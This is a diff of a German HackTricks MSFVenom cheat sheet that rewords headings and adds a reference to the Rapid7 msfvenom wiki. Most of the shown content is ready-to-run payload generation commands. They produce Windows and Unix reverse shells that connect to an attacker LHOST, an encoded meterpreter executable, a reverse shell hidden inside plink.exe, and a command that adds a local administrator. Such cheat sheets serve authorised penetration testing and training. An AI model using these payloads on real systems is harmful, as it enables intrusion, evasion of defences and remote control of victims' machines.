@@ -1,6 +1,4 @@
-# MSFVenom - Spickzettel
-
-{{#include ../../banners/hacktricks-training.md}}
+# MSFVenom - CheatSheet
 
 ---
 
@@ -8,14 +6,16 @@
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Man kann auch `-a` verwenden, um die Architektur oder die `--platform` anzugeben.
+Verwende `-a`, um die Payload-Architektur auszuwählen, und `--platform`, um die Zielplattform auszuwählen.<sup>[[1]](#references)</sup>
 
 ## Auflisten
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Gängige Parameter beim Erstellen von Shellcode
+Diese Befehle listen die im installierten Framework verfügbaren Payload- und Encoder-Module auf.<sup>[[1]](#references)</sup>
+
+## Allgemeine Parameter beim Erstellen eines Shellcodes
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Die hier gezeigten Flags wählen ungültige Zeichen, das Ausgabeformat, den Encoder und die Encoding-Iterationen aus.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -50,7 +52,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### In eine ausführbare Datei eingebettet
+### Eingebettet in eine ausführbare Datei
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [So verwendest du msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
